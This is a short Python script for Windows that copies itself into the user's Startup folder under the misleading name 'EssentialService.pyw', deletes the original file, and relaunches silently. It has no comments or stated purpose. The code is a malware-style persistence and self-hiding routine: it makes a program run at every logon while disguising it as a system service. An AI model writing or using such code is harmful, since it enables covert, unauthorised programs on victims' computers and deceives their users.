import os
import sys
import shutil

STARTUP_PATH = os.path.join(os.getenv('APPDATA'),  r'Microsoft\Windows\Start Menu\Programs\Startup')

CURRENT_PATH = os.path.dirname(__file__)

if STARTUP_PATH != CURRENT_PATH:
    shutil.copy2(os.path.join(CURRENT_PATH, __file__), os.path.join(STARTUP_PATH, 'EssentialService.pyw'))
    os.remove(os.path.join(CURRENT_PATH, __file__))
    os.startfile(os.path.join(STARTUP_PATH, 'EssentialService.pyw'))
    sys.exit()